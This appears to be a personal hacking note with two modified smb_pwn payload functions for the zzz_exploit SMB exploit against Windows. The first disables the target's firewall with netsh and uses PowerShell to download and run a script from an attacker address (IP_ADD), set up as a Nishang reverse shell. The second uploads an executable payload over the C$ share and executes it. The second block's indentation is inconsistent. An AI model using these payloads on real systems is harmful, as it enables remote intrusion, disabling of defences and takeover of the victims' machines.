#### various zzz_exploit approaches

```
def smb_pwn(conn, arch):                                                                                                                                                        
    smbConn = conn.get_smbconnection()                                                                                                                                                                                                                   
    service_exec(conn, r'cmd /c netsh advfirewall set allprofiles state off')
# Invoke-PowerShellTcp.ps1
# wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
# insert line: Invoke-PowerShellTcp -Reverse -IPAddress IP_ADD -Port 443
    service_exec(conn, r"cmd /c powershell iex(new-object net.webclient).downloadstring('http://IP_ADD/hello.ps1')"
```

```
def smb_pwn(conn, shellcode_file, arch):
	smbConn = conn.get_smbconnection()
	
	print('creating file c:\\pwned.txt on the target')
	tid2 = smbConn.connectTree('C$')
	fid2 = smbConn.createFile(tid2, '/pwned.txt')
	smbConn.closeFile(tid2, fid2)
	smbConn.disconnectTree(tid2)
	
	print('sending user shellcode file')
  smb_send_file(smbConn, shellcode_file, 'C', '/msf.exe')
  
  print('executing user shellcode via cmd.exe')
  service_exec(conn, r'cmd /c C:\\msf.exe')
```
